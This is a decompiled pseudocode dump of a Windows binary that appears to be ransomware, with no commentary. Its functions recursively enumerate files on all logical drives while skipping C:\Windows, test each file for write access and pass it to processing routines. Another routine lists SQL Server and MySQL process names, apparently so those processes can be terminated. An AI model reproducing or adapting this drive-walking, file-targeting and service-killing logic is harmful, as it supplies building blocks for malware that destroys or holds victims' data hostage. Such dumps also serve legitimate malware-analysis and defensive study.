            v55 = (LPCWSTR *)(2 * v119 + 37);
            v135 = v55;
            v56 = *(void **)(v117[0] - 4);
            if ( (unsigned int)(v117[0] - (_DWORD)v56 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          v102 = v55;
          sub_46C87D(v56);
        }
        v118 = 0;
        v119 = 7;
        LOWORD(v117[0]) = 0;
      }
      if ( v54 )
      {
        v116 = &v97;
        sub_419530(&v97, &a21);
        LOBYTE(v148) = 21;
        v121 = (int *)&v89;
        sub_419530(&v89, &a8);
        LOBYTE(v148) = 22;
        v120 = (int *)&v83;
        sub_419530(&v83, &a15);
        LOBYTE(v148) = 23;
        v124 = (int *)&v77;
        sub_419BE0(&v77, &a2);
        LOBYTE(v148) = 24;
        v123 = v76;
        sub_419530(v76, lpFileName);
        LOBYTE(v148) = 17;
        sub_40AAB0(
          v126,
          (int)&savedregs,
          v76[0],
          (int)v76[1],
          (int)v76[2],
          (int)v76[3],
          (int)v76[4],
          (unsigned int)v76[5],
          v77,
          v78,
          v79,
          v80,
          v81,
          v82,
          v83,
          v84,
          v85,
          v86,
          v87,
          v88,
          v89,
          v90,
          v91,
          v92,
          v93,
          v94,
          v95,
          v96,
          v97,
          v98,
          v99,
          v100,
          v101,
          (unsigned int)v102);
      }
      LOBYTE(v148) = 10;
      if ( v131 >= 8 )
      {
        v57 = (LPCWSTR *)(2 * v131 + 2);
        v134 = v57;
        v58 = (void *)v130[0];
        if ( (unsigned int)v57 >= 0x1000 )
        {
          v57 = (LPCWSTR *)(2 * v131 + 37);
          v134 = v57;
          v58 = *(void **)(v130[0] - 4);
          if ( (unsigned int)(v130[0] - (_DWORD)v58 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        v102 = v57;
        sub_46C87D(v58);
      }
      v130[4] = 0;
      v131 = 7;
      LOWORD(v130[0]) = 0;
      v148 = 6;
      v26 = v127;
    }
    v28 = hFindFile;
  }
  while ( FindNextFileW(v28, &FindFileData) );
  FindClose(v28);
  v62 = v145;
  v60 = HIDWORD(v62);
  v61 = v62;
  v142 = v145;
  while ( v61 != v60 )
  {
    v123 = (wchar_t **)&v97;
    sub_419530(&v97, &a21);
    LOBYTE(v148) = 28;
    v124 = &v91;
    sub_419530(&v91, &a15);
    LOBYTE(v148) = 29;
    v90 = v126;
    v120 = &v84;
    sub_419530(&v84, &a8);
    LOBYTE(v148) = 30;
    v121 = &v78;
    sub_419BE0(&v78, &a2);
    LOBYTE(v148) = 6;
    sub_40E9E0(
      v61,
      v78,
      v79,
      v80,
      v81,
      v82,
      v83,
      v84,
      v85,
      v86,
      v87,
      v88,
      v89,
      v90,
      v91,
      v92,
      v93,
      v94,
      v95,
      v96,
      v97,
      v98,
      v99,
      v100,
      v101,
      v102);
    v61 += 24;
    v142 = v61;
  }
  LOBYTE(v148) = 5;
  if ( v144 >= 8 )
  {
    v63 = (LPCWSTR *)(2 * v144 + 2);
    v133 = v63;
    v64 = (WCHAR *)lpFileName[0];
    if ( (unsigned int)v63 >= 0x1000 )
    {
      v63 = (LPCWSTR *)(2 * v144 + 37);
      v133 = v63;
      v64 = (WCHAR *)*((_DWORD *)lpFileName[0] - 1);
      if ( (unsigned int)((char *)lpFileName[0] - (char *)v64 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v102 = v63;
    sub_46C87D(v64);
  }
  lpFileName[4] = 0;
  v144 = 7;
  LOWORD(lpFileName[0]) = 0;
  LOBYTE(v148) = 4;
  if ( (_DWORD)v145 )
  {
    v102 = (LPCWSTR *)v145;
    sub_425130(v145, SHIDWORD(v145));
    v65 = (void *)v145;
    v66 = 24 * ((v146 - (int)v145) / 24);
    v132 = v66;
    if ( v66 >= 0x1000 )
    {
      v66 += 35;
      v132 = v66;
      v65 = *(void **)(v145 - 4);
      if ( (unsigned int)(v145 - (_DWORD)v65 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v102 = (LPCWSTR *)v66;
    sub_46C87D(v65);
    v145 = 0i64;
    v146 = 0;
  }
  v148 = 2;
  if ( a7 >= 0x10 )
  {
    v67 = a7 + 1;
    v68 = a2;
    if ( a7 + 1 >= 0x1000 )
    {
      v67 = a7 + 36;
      v68 = (_BYTE *)*((_DWORD *)a2 - 1);
      if ( (unsigned int)(a2 - v68 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v103 = v67;
    sub_46C87D(v68);
  }
  a6 = 0;
  a7 = 15;
  LOBYTE(a2) = 0;
  LOBYTE(v148) = 1;
  if ( a13 >= 8 )
  {
    v69 = 2 * a13 + 2;
    v70 = a8;
    if ( v69 >= 0x1000 )
    {
      v69 = 2 * a13 + 37;
      v70 = (_BYTE *)*((_DWORD *)a8 - 1);
      if ( (unsigned int)(a8 - v70 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v103 = v69;
    sub_46C87D(v70);
  }
  a12 = 0;
  a13 = 7;
  LOWORD(a8) = 0;
  LOBYTE(v148) = 0;
  if ( a20 >= 8 )
  {
    v71 = 2 * a20 + 2;
    v72 = a15;
    if ( v71 >= 0x1000 )
    {
      v71 = 2 * a20 + 37;
      v72 = (_BYTE *)*((_DWORD *)a15 - 1);
      if ( (unsigned int)(a15 - v72 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v103 = v71;
    sub_46C87D(v72);
  }
  a19 = 0;
  a20 = 7;
  LOWORD(a15) = 0;
  v148 = -1;
  if ( a26 >= 8 )
  {
    v73 = 2 * a26 + 2;
    v74 = a21;
    if ( v73 >= 0x1000 )
    {
      v73 = 2 * a26 + 37;
      v74 = (_BYTE *)*((_DWORD *)a21 - 1);
      if ( (unsigned int)(a21 - v74 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v103 = v73;
    sub_46C87D(v74);
  }
  a25 = 0;
  a26 = 7;
  result = 0;
  LOWORD(a21) = 0;
  return result;
}
// 40ECFD: variable 'v42' is possibly undefined
// 40EE7F: variable 'v52' is possibly undefined
// 40EE92: variable 'v53' is possibly undefined
// 40F065: variable 'v59' is possibly undefined
// 4CD0C0: using guessed type wchar_t aCWindows[11];
// 4CD0D8: using guessed type wchar_t aCWindows_0[13];
// 4CD168: using guessed type wchar_t asc_4CD168[3];

//----- (0040F410) --------------------------------------------------------
int __cdecl sub_40F410(
        _DWORD *a1,
        _BYTE *a2,
        int a3,
        int a4,
        int a5,
        int a6,
        unsigned int a7,
        _BYTE *a8,
        int a9,
        int a10,
        int a11,
        int a12,
        unsigned int a13,
        int a14,
        _BYTE *a15,
        int a16,
        int a17,
        int a18,
        int a19,
        unsigned int a20,
        _BYTE *a21,
        int a22,
        int a23,
        int a24,
        int a25,
        unsigned int a26)
{
  int v26; // edi
  const WCHAR *v27; // eax
  HANDLE v28; // ebx
  int v29; // esi
  char *v30; // eax
  int v31; // eax
  LPCWSTR *v32; // ecx
  void *v33; // edx
  LPCWSTR *v34; // ecx
  void *v35; // edx
  LPCWSTR *v36; // ecx
  void *v37; // edx
  const wchar_t *v38; // eax
  FILE *v39; // eax
  WCHAR *v40; // eax
  bool v41; // bl
  int v42; // ecx
  LPCWSTR *v43; // ecx
  void *v44; // edx
  WCHAR *v45; // eax
  LPCWSTR *v46; // ecx
  void *v47; // edx
  _DWORD *v48; // eax
  int v49; // ecx
  LPCWSTR *v50; // ecx
  void *v51; // edx
  char *v52; // eax
  int v53; // ecx
  int v54; // ecx
  char v55; // bl
  LPCWSTR *v56; // ecx
  void *v57; // edx
  LPCWSTR *v58; // ecx
  void *v59; // edx
  int v60; // ecx
  int v61; // edi
  int v62; // esi
  unsigned __int64 v63; // kr00_8
  LPCWSTR *v64; // ecx
  WCHAR *v65; // edx
  void *v66; // esi
  unsigned int v67; // ecx
  int v68; // edx
  _BYTE *v69; // ecx
  unsigned int v70; // edx
  _BYTE *v71; // ecx
  unsigned int v72; // edx
  _BYTE *v73; // ecx
  unsigned int v74; // edx
  _BYTE *v75; // ecx
  int result; // eax
  wchar_t *v77[6]; // [esp-80h] [ebp-438h] BYREF
  _BYTE *v78; // [esp-68h] [ebp-420h] BYREF
  int v79; // [esp-64h] [ebp-41Ch] BYREF
  int v80; // [esp-60h] [ebp-418h]
  int v81; // [esp-5Ch] [ebp-414h]
  int v82; // [esp-58h] [ebp-410h]
  unsigned int v83; // [esp-54h] [ebp-40Ch]
  _BYTE *v84; // [esp-50h] [ebp-408h] BYREF
  int v85; // [esp-4Ch] [ebp-404h] BYREF
  int v86; // [esp-48h] [ebp-400h]
  int v87; // [esp-44h] [ebp-3FCh]
  int v88; // [esp-40h] [ebp-3F8h]
  unsigned int v89; // [esp-3Ch] [ebp-3F4h]
  _BYTE *v90; // [esp-38h] [ebp-3F0h] BYREF
  int v91; // [esp-34h] [ebp-3ECh]
  int v92; // [esp-30h] [ebp-3E8h] BYREF
  int v93; // [esp-2Ch] [ebp-3E4h]
  int v94; // [esp-28h] [ebp-3E0h]
  unsigned int v95; // [esp-24h] [ebp-3DCh]
  int v96; // [esp-20h] [ebp-3D8h]
  int v97; // [esp-1Ch] [ebp-3D4h]
  _BYTE *v98; // [esp-18h] [ebp-3D0h] BYREF
  int v99; // [esp-14h] [ebp-3CCh]
  int v100; // [esp-10h] [ebp-3C8h]
  int v101; // [esp-Ch] [ebp-3C4h]
  int v102; // [esp-8h] [ebp-3C0h]
  LPCWSTR *v103; // [esp-4h] [ebp-3BCh]
  unsigned int v104; // [esp+0h] [ebp-3B8h] BYREF
  int v105[5]; // [esp+10h] [ebp-3A8h] BYREF
  unsigned int v106; // [esp+24h] [ebp-394h]
  int v107[5]; // [esp+28h] [ebp-390h] BYREF
  unsigned int v108; // [esp+3Ch] [ebp-37Ch]
  int v109[5]; // [esp+40h] [ebp-378h] BYREF
  unsigned int v110; // [esp+54h] [ebp-364h]
  int v111[5]; // [esp+58h] [ebp-360h] BYREF
  unsigned int v112; // [esp+6Ch] [ebp-34Ch]
  int v113[5]; // [esp+70h] [ebp-348h] BYREF
  unsigned int v114; // [esp+84h] [ebp-334h]
  int v115[5]; // [esp+88h] [ebp-330h] BYREF
  unsigned int v116; // [esp+9Ch] [ebp-31Ch]
  _BYTE **v117; // [esp+A0h] [ebp-318h]
  int v118[4]; // [esp+ACh] [ebp-30Ch] BYREF
  int v119; // [esp+BCh] [ebp-2FCh]
  unsigned int v120; // [esp+C0h] [ebp-2F8h]
  int *v121; // [esp+C4h] [ebp-2F4h]
  int *v122; // [esp+C8h] [ebp-2F0h]
  __int64 v123; // [esp+CCh] [ebp-2ECh]
  wchar_t **v124; // [esp+D4h] [ebp-2E4h]
  int *v125; // [esp+D8h] [ebp-2E0h]
  _DWORD *v126; // [esp+DCh] [ebp-2DCh]
  int v127; // [esp+E0h] [ebp-2D8h]
  int v128; // [esp+E4h] [ebp-2D4h]
  HANDLE hFindFile; // [esp+E8h] [ebp-2D0h]
  struct _WIN32_FIND_DATAW FindFileData; // [esp+ECh] [ebp-2CCh] BYREF
  int v131[5]; // [esp+33Ch] [ebp-7Ch] BYREF
  unsigned int v132; // [esp+350h] [ebp-68h]
  unsigned int v133; // [esp+354h] [ebp-64h]
  LPCWSTR *v134; // [esp+358h] [ebp-60h]
  LPCWSTR *v135; // [esp+35Ch] [ebp-5Ch]
  LPCWSTR *v136; // [esp+360h] [ebp-58h]
  LPCWSTR *v137; // [esp+364h] [ebp-54h]
  LPCWSTR *v138; // [esp+368h] [ebp-50h]
  LPCWSTR *v139; // [esp+36Ch] [ebp-4Ch]
  LPCWSTR *v140; // [esp+370h] [ebp-48h]
  LPCWSTR *v141; // [esp+374h] [ebp-44h]
  LPCWSTR *v142; // [esp+378h] [ebp-40h]
  int v143; // [esp+37Ch] [ebp-3Ch]
  LPCWSTR lpFileName[5]; // [esp+380h] [ebp-38h] BYREF
  unsigned int v145; // [esp+394h] [ebp-24h]
  unsigned __int64 v146; // [esp+398h] [ebp-20h] BYREF
  int v147; // [esp+3A0h] [ebp-18h]
  int *v148; // [esp+3A8h] [ebp-10h]
  int v149; // [esp+3B4h] [ebp-4h]
  int savedregs; // [esp+3B8h] [ebp+0h] BYREF

  v148 = (int *)&v104;
  v126 = a1;
  v127 = a14;
  v26 = 0;
  v128 = 0;
  v149 = 5;
  v146 = 0i64;
  v147 = 0;
  sub_4229A0((int)lpFileName, a1, L"\\*");
  LOBYTE(v149) = 6;
  v27 = (const WCHAR *)lpFileName;
  if ( v145 >= 8 )
    v27 = lpFileName[0];
  hFindFile = FindFirstFileW(v27, &FindFileData);
  if ( hFindFile == (HANDLE)-1 )
    sub_422D50(byte_4F0290, "fuck");
  v28 = hFindFile;
  do
  {
    v29 = sub_4194E0((int)v111, FindFileData.cFileName);
    LOBYTE(v149) = 7;
    v30 = (char *)sub_4229A0((int)v113, v126, (unsigned __int16 *)"\\");
    LOBYTE(v149) = 8;
    v31 = sub_421BF0((int)v115, v30, v29);
    LOBYTE(v149) = 9;
    sub_419470((int)lpFileName, v31);
    LOBYTE(v149) = 8;
    if ( v116 >= 8 )
    {
      v32 = (LPCWSTR *)(2 * v116 + 2);
      v142 = v32;
      v33 = (void *)v115[0];
      if ( (unsigned int)v32 >= 0x1000 )
      {
        v32 = (LPCWSTR *)(2 * v116 + 37);
        v142 = v32;
        v33 = *(void **)(v115[0] - 4);
        if ( (unsigned int)(v115[0] - (_DWORD)v33 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v103 = v32;
      sub_46C87D(v33);
    }
    v115[4] = 0;
    v116 = 7;
    LOWORD(v115[0]) = 0;
    LOBYTE(v149) = 7;
    if ( v114 >= 8 )
    {
      v34 = (LPCWSTR *)(2 * v114 + 2);
      v141 = v34;
      v35 = (void *)v113[0];
      if ( (unsigned int)v34 >= 0x1000 )
      {
        v34 = (LPCWSTR *)(2 * v114 + 37);
        v141 = v34;
        v35 = *(void **)(v113[0] - 4);
        if ( (unsigned int)(v113[0] - (_DWORD)v35 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v103 = v34;
      sub_46C87D(v35);
    }
    v113[4] = 0;
    v114 = 7;
    LOWORD(v113[0]) = 0;
    LOBYTE(v149) = 6;
    if ( v112 >= 8 )
    {
      v36 = (LPCWSTR *)(2 * v112 + 2);
      v140 = v36;
      v37 = (void *)v111[0];
      if ( (unsigned int)v36 >= 0x1000 )
      {
        v36 = (LPCWSTR *)(2 * v112 + 37);
        v140 = v36;
        v37 = *(void **)(v111[0] - 4);
        if ( (unsigned int)(v111[0] - (_DWORD)v37 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v103 = v36;
      sub_46C87D(v37);
    }
    v111[4] = 0;
    v112 = 7;
    LOWORD(v111[0]) = 0;
    if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
    {
      if ( lstrcmpW(FindFileData.cFileName, ".")
        && lstrcmpW(FindFileData.cFileName, L"..")
        && sub_4191C0((char *)lpFileName, L"C:\\Windows", v60) == -1 )
      {
        v103 = lpFileName;
        if ( v147 == HIDWORD(v146) )
        {
          sub_423CD0((int *)&v146, SHIDWORD(v146), v103);
        }
        else
        {
          sub_419530((_DWORD *)HIDWORD(v146), v103);
          HIDWORD(v146) += 24;
        }
      }
    }
    else
    {
      LOBYTE(v149) = 10;
      v38 = (const wchar_t *)lpFileName;
      if ( v145 >= 8 )
        v38 = lpFileName[0];
      v39 = _wfopen(v38, L"r+b");
      if ( !v39 )
      {
        LOBYTE(v149) = 6;
        continue;
      }
      fclose(v39);
      v40 = (WCHAR *)sub_421E60((int)v109, (unsigned int *)lpFileName, (int)v103);
      LOBYTE(v149) = 11;
      v41 = sub_404BC0(v40);
      LOBYTE(v149) = 10;
      v42 = v110;
      if ( v110 >= 8 )
      {
        v43 = (LPCWSTR *)(2 * v110 + 2);
        v139 = v43;
        v44 = (void *)v109[0];
        if ( (unsigned int)v43 >= 0x1000 )
        {
          v43 = (LPCWSTR *)(2 * v110 + 37);
          v139 = v43;
          v44 = *(void **)(v109[0] - 4);
          if ( (unsigned int)(v109[0] - (_DWORD)v44 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        v103 = v43;
        sub_46C87D(v44);
      }
      v109[4] = 0;
      v110 = 7;
      LOWORD(v109[0]) = 0;
      if ( v41 )
      {
        v45 = (WCHAR *)sub_421E60((int)v107, (unsigned int *)lpFileName, v42);
        LOBYTE(v149) = 13;
        v123 = sub_404B60(v45);
        LOBYTE(v149) = 10;
        v42 = v108;
        if ( v108 >= 8 )
        {
          v46 = (LPCWSTR *)(2 * v108 + 2);
          v138 = v46;
          v47 = (void *)v107[0];
          if ( (unsigned int)v46 >= 0x1000 )
          {
            v46 = (LPCWSTR *)(2 * v108 + 37);
            v138 = v46;
            v47 = *(void **)(v107[0] - 4);
            if ( (unsigned int)(v107[0] - (_DWORD)v47 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          v103 = v46;
          sub_46C87D(v47);
        }
        v107[4] = 0;
        v108 = 7;
        LOWORD(v107[0]) = 0;
      }
      v48 = (_DWORD *)sub_421E60((int)v105, (unsigned int *)lpFileName, v42);
      LOBYTE(v149) = 15;
      sub_404120(v48, (int)v131);
      LOBYTE(v149) = 17;
      v49 = v106;
      if ( v106 >= 8 )
      {
        v50 = (LPCWSTR *)(2 * v106 + 2);
        v137 = v50;
        v51 = (void *)v105[0];
        if ( (unsigned int)v50 >= 0x1000 )
        {
          v50 = (LPCWSTR *)(2 * v106 + 37);
          v137 = v50;
          v51 = *(void **)(v105[0] - 4);
          if ( (unsigned int)(v105[0] - (_DWORD)v51 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        v103 = v50;
        sub_46C87D(v51);
      }
      v105[4] = 0;
      v106 = 7;
      LOWORD(v105[0]) = 0;
      if ( v123 < (unsigned int)&unk_4C4C6C )
        goto LABEL_44;
      sub_421E60((int)v118, (unsigned int *)&a21, v49);
      LOBYTE(v149) = 19;
      v128 = v26 | 1;
      v52 = (char *)v118;
      if ( v120 >= 8 )
        v52 = (char *)v118[0];
      if ( sub_403F60(v131, v52, v119)
        && sub_4191C0((char *)lpFileName, L"C:\\Windows", v53) == -1
        && sub_4191C0((char *)lpFileName, L"C:\\\\Windows\\", v54) == -1 )
      {
        v55 = 1;
      }
      else
      {
LABEL_44:
        v55 = 0;
      }
      v149 = 17;
      if ( (v128 & 1) != 0 )
      {
        v128 &= ~1u;
        LOBYTE(v149) = 17;
        if ( v120 >= 8 )
        {
          v56 = (LPCWSTR *)(2 * v120 + 2);
          v136 = v56;
          v57 = (void *)v118[0];
          if ( (unsigned int)v56 >= 0x1000 )
          {
            v56 = (LPCWSTR *)(2 * v120 + 37);
            v136 = v56;
            v57 = *(void **)(v118[0] - 4);
            if ( (unsigned int)(v118[0] - (_DWORD)v57 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          v103 = v56;
          sub_46C87D(v57);
        }
        v119 = 0;
        v120 = 7;
        LOWORD(v118[0]) = 0;
      }
      if ( v55 )
      {
        v117 = &v98;
        sub_419530(&v98, &a21);
        LOBYTE(v149) = 21;
        v122 = (int *)&v90;
        sub_419530(&v90, &a8);
        LOBYTE(v149) = 22;
        v121 = (int *)&v84;
        sub_419530(&v84, &a15);
        LOBYTE(v149) = 23;
        v125 = (int *)&v78;
        sub_419BE0(&v78, &a2);
        LOBYTE(v149) = 24;
        v124 = v77;
        sub_419530(v77, lpFileName);
        LOBYTE(v149) = 17;
        sub_40AAB0(
          v127,
          (int)&savedregs,
          v77[0],
          (int)v77[1],
          (int)v77[2],
          (int)v77[3],
          (int)v77[4],
          (unsigned int)v77[5],
          v78,
          v79,
          v80,
          v81,
          v82,
          v83,
          v84,
          v85,
          v86,
          v87,
          v88,
          v89,
          v90,
          v91,
          v92,
          v93,
          v94,
          v95,
          v96,
          v97,
          v98,
          v99,
          v100,
          v101,
          v102,
          (unsigned int)v103);
      }
      LOBYTE(v149) = 10;
      if ( v132 >= 8 )
      {
        v58 = (LPCWSTR *)(2 * v132 + 2);
        v135 = v58;
        v59 = (void *)v131[0];
        if ( (unsigned int)v58 >= 0x1000 )
        {
          v58 = (LPCWSTR *)(2 * v132 + 37);
          v135 = v58;
          v59 = *(void **)(v131[0] - 4);
          if ( (unsigned int)(v131[0] - (_DWORD)v59 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        v103 = v58;
        sub_46C87D(v59);
      }
      v131[4] = 0;
      v132 = 7;
      LOWORD(v131[0]) = 0;
      v149 = 6;
      v26 = v128;
    }
    v28 = hFindFile;
  }
  while ( FindNextFileW(v28, &FindFileData) );
  FindClose(v28);
  v63 = v146;
  v61 = HIDWORD(v63);
  v62 = v63;
  v143 = v146;
  while ( v62 != v61 )
  {
    v124 = (wchar_t **)&v98;
    sub_419530(&v98, &a21);
    LOBYTE(v149) = 28;
    v125 = &v92;
    sub_419530(&v92, &a15);
    LOBYTE(v149) = 29;
    v91 = v127;
    v121 = &v85;
    sub_419530(&v85, &a8);
    LOBYTE(v149) = 30;
    v122 = &v79;
    sub_419BE0(&v79, &a2);
    LOBYTE(v149) = 6;
    sub_40F410(
      v62,
      v79,
      v80,
      v81,
      v82,
      v83,
      v84,
      v85,
      v86,
      v87,
      v88,
      v89,
      v90,
      v91,
      v92,
      v93,
      v94,
      v95,
      v96,
      v97,
      v98,
      v99,
      v100,
      v101,
      v102,
      v103);
    v62 += 24;
    v143 = v62;
  }
  LOBYTE(v149) = 5;
  if ( v145 >= 8 )
  {
    v64 = (LPCWSTR *)(2 * v145 + 2);
    v134 = v64;
    v65 = (WCHAR *)lpFileName[0];
    if ( (unsigned int)v64 >= 0x1000 )
    {
      v64 = (LPCWSTR *)(2 * v145 + 37);
      v134 = v64;
      v65 = (WCHAR *)*((_DWORD *)lpFileName[0] - 1);
      if ( (unsigned int)((char *)lpFileName[0] - (char *)v65 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v103 = v64;
    sub_46C87D(v65);
  }
  lpFileName[4] = 0;
  v145 = 7;
  LOWORD(lpFileName[0]) = 0;
  LOBYTE(v149) = 4;
  if ( (_DWORD)v146 )
  {
    v103 = (LPCWSTR *)v146;
    sub_425130(v146, SHIDWORD(v146));
    v66 = (void *)v146;
    v67 = 24 * ((v147 - (int)v146) / 24);
    v133 = v67;
    if ( v67 >= 0x1000 )
    {
      v67 += 35;
      v133 = v67;
      v66 = *(void **)(v146 - 4);
      if ( (unsigned int)(v146 - (_DWORD)v66 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v103 = (LPCWSTR *)v67;
    sub_46C87D(v66);
    v146 = 0i64;
    v147 = 0;
  }
  v149 = 2;
  if ( a7 >= 0x10 )
  {
    v68 = a7 + 1;
    v69 = a2;
    if ( a7 + 1 >= 0x1000 )
    {
      v68 = a7 + 36;
      v69 = (_BYTE *)*((_DWORD *)a2 - 1);
      if ( (unsigned int)(a2 - v69 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v104 = v68;
    sub_46C87D(v69);
  }
  a6 = 0;
  a7 = 15;
  LOBYTE(a2) = 0;
  LOBYTE(v149) = 1;
  if ( a13 >= 8 )
  {
    v70 = 2 * a13 + 2;
    v71 = a8;
    if ( v70 >= 0x1000 )
    {
      v70 = 2 * a13 + 37;
      v71 = (_BYTE *)*((_DWORD *)a8 - 1);
      if ( (unsigned int)(a8 - v71 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v104 = v70;
    sub_46C87D(v71);
  }
  a12 = 0;
  a13 = 7;
  LOWORD(a8) = 0;
  LOBYTE(v149) = 0;
  if ( a20 >= 8 )
  {
    v72 = 2 * a20 + 2;
    v73 = a15;
    if ( v72 >= 0x1000 )
    {
      v72 = 2 * a20 + 37;
      v73 = (_BYTE *)*((_DWORD *)a15 - 1);
      if ( (unsigned int)(a15 - v73 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v104 = v72;
    sub_46C87D(v73);
  }
  a19 = 0;
  a20 = 7;
  LOWORD(a15) = 0;
  v149 = -1;
  if ( a26 >= 8 )
  {
    v74 = 2 * a26 + 2;
    v75 = a21;
    if ( v74 >= 0x1000 )
    {
      v74 = 2 * a26 + 37;
      v75 = (_BYTE *)*((_DWORD *)a21 - 1);
      if ( (unsigned int)(a21 - v75 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v104 = v74;
    sub_46C87D(v75);
  }
  a25 = 0;
  a26 = 7;
  result = 0;
  LOWORD(a21) = 0;
  return result;
}
// 40F72D: variable 'v42' is possibly undefined
// 40F85F: variable 'v49' is possibly undefined
// 40F8A2: variable 'v53' is possibly undefined
// 40F8B5: variable 'v54' is possibly undefined
// 40FA88: variable 'v60' is possibly undefined
// 4CD0C0: using guessed type wchar_t aCWindows[11];
// 4CD0D8: using guessed type wchar_t aCWindows_0[13];
// 4CD168: using guessed type wchar_t asc_4CD168[3];

//----- (0040FE30) --------------------------------------------------------
int *__thiscall sub_40FE30(int *this)
{
  int v2; // ebx
  int v3; // edi
  int v4; // edx
  char *v5; // edx
  int v7; // [esp-8h] [ebp-21Ch]
  int v8; // [esp-4h] [ebp-218h]
  DWORD LogicalDrives; // [esp+14h] [ebp-200h]
  int v10; // [esp+20h] [ebp-1F4h] BYREF
  char v11[480]; // [esp+24h] [ebp-1F0h] BYREF
  int v12; // [esp+210h] [ebp-4h]

  LogicalDrives = GetLogicalDrives();
  *(_QWORD *)this = 0i64;
  v10 = 6044225;
  this[2] = 0;
  sub_4172C0(this, v7, v8);
  v12 = 0;
  `eh vector constructor iterator'(
    v11,
    0x18u,
    0x14u,
    (void (__thiscall *)(void *))sub_419BC0,
    (void (__thiscall *)(void *))sub_4199E0);
  v12 = 1;
  v2 = 0;
  v3 = 0;
  do
  {
    if ( ((1 << v2) & LogicalDrives) != 0 )
    {
      v4 = *this;
      LOBYTE(v10) = v2 + 65;
      v5 = (char *)(v3 + v4);
      v3 += 24;
      sub_41ED70(v5, 0, (char *)&v10, &v11[strlen((const char *)&v10) - 3] - ((char *)&v10 + 1));
    }
    ++v2;
  }
  while ( v2 < 26 );
  LOBYTE(v12) = 0;
  `eh vector destructor iterator'(v11, 0x18u, 0x14u, (void (__thiscall *)(void *))sub_4199E0);
  return this;
}
// 40FEA6: variable 'v7' is possibly undefined
// 40FEA6: variable 'v8' is possibly undefined
// 46C502: using guessed type void __stdcall `eh vector destructor iterator'(void *, unsigned int, unsigned int, void (__thiscall *)(void *));
// 46C8AE: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, unsigned int, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (0040FF70) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
void sub_40FF70()
{
  unsigned int v0; // edi
  void (__stdcall *v1)(HANDLE); // esi
  HANDLE Toolhelp32Snapshot; // ebx
  BOOL i; // eax
  _QWORD *v4; // ecx
  int v5; // eax
  HANDLE v6; // eax
  HANDLE v7; // esi
  void *v8; // [esp-4h] [ebp-234h]
  int v9; // [esp+0h] [ebp-230h] BYREF
  unsigned int v10; // [esp+18h] [ebp-218h]
  PROCESSENTRY32 pe; // [esp+1Ch] [ebp-214h] BYREF
  _QWORD v12[2]; // [esp+144h] [ebp-ECh] BYREF
  int v13; // [esp+154h] [ebp-DCh]
  int v14; // [esp+158h] [ebp-D8h]
  void *v15[6]; // [esp+15Ch] [ebp-D4h] BYREF
  void *v16[6]; // [esp+174h] [ebp-BCh] BYREF
  void *v17[6]; // [esp+18Ch] [ebp-A4h] BYREF
  void *v18[6]; // [esp+1A4h] [ebp-8Ch] BYREF
  void *v19[6]; // [esp+1BCh] [ebp-74h] BYREF
  void *v20[6]; // [esp+1D4h] [ebp-5Ch] BYREF
  void *v21[6]; // [esp+1ECh] [ebp-44h] BYREF
  char v22[24]; // [esp+204h] [ebp-2Ch] BYREF
  int *v23; // [esp+220h] [ebp-10h]
  int v24; // [esp+22Ch] [ebp-4h]

  v23 = &v9;
  v13 = 0;
  v14 = 15;
  LOBYTE(v12[0]) = 0;
  sub_41EF80((void **)v12, "sqlserver.exe", 0xDu);
  v24 = 0;
  v15[4] = 0;
  v15[5] = (void *)15;
  LOBYTE(v15[0]) = 0;
  sub_41EF80(v15, "msftesql.exe", 0xCu);
  LOBYTE(v24) = 1;
  v16[4] = 0;
  v16[5] = (void *)15;
  LOBYTE(v16[0]) = 0;
  sub_41EF80(v16, "sqlagent.exe", 0xCu);
  LOBYTE(v24) = 2;
  v17[4] = 0;
  v17[5] = (void *)15;
  LOBYTE(v17[0]) = 0;
  sub_41EF80(v17, "sqlbrowser.exe", 0xEu);
  LOBYTE(v24) = 3;
  v18[4] = 0;
  v18[5] = (void *)15;
  LOBYTE(v18[0]) = 0;
  sub_41EF80(v18, "sqlwriter.exe", 0xDu);
  LOBYTE(v24) = 4;
  v19[4] = 0;
  v19[5] = (void *)15;
  LOBYTE(v19[0]) = 0;
  sub_41EF80(v19, "mysqld.exe", 0xAu);
  LOBYTE(v24) = 5;
  v20[4] = 0;
  v20[5] = (void *)15;
  LOBYTE(v20[0]) = 0;
  sub_41EF80(v20, "mysqld-nt.exe", 0xDu);
  LOBYTE(v24) = 6;
  v21[4] = 0;
  v21[5] = (void *)15;
  LOBYTE(v21[0]) = 0;
  sub_41EF80(v21, "mysqld-opt.exe", 0xEu);
  LOBYTE(v24) = 7;
  `eh vector constructor iterator'(
    v22,
    0x18u,
    1u,
    (void (__thiscall *)(void *))sub_419BC0,
    (void (__thiscall *)(void *))sub_4199E0);
  v24 = 9;
  v0 = 0;
  v10 = 0;
